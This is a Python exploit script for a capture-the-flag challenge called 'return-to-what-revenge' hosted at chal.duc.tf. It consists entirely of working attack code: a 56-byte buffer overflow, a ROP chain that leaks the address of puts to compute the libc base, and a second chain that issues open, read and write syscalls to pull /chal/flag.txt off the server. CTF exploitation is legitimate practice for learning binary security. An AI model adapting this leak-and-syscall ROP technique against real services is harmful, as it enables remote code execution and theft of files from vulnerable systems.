from roppy import *

p = remote("chal.duc.tf", 30006)

elf = ELF("return-to-what-revenge")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
pop_rdi = 0x00000000004019db
flag_location = elf.section(".bss") + 0x400
flag = elf.section(".bss") + 0x200

payload = b"A"*56
payload += p64(pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))

payload += p64(pop_rdi)
payload += p64(flag_location)
payload += p64(elf.plt('gets'))

payload += p64(elf.function("vuln"))
p.sendlineafter("?\n", payload)

# Parse the leaked address
leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK:   0x%x" %(leak))
libc.address = leak - libc.function("puts")

pop_rdx = libc.address + 0x0000000000001b96
pop_rsi = libc.address + 0x0000000000023e6a
syscall = libc.address + 0x00000000000d2975
pop_rax = libc.address + 0x00000000000439c8 

log.info("LIBC:   0x%x" %(libc.address))

p.sendline("/chal/flag.txt")


payload = b"A"*56
payload += p64(0x401016) # ret; since it is Ubuntu 18.04


'''
open("/chal/flag.txt", 0);
'''
payload += p64(pop_rax)
payload += p64(0x2)
payload += p64(pop_rdi)
payload += p64(flag_location)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(syscall)

'''
read(0x3, flag, 0x100);
'''
payload += p64(pop_rdi)
payload += p64(0x3)
payload += p64(pop_rsi)
payload += p64(flag)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0x0)
payload += p64(syscall)

'''
write(1, flag, 0x100);
'''
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(flag)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0x1)
payload += p64(syscall)

p.sendlineafter("?\n", payload)
p.interactive()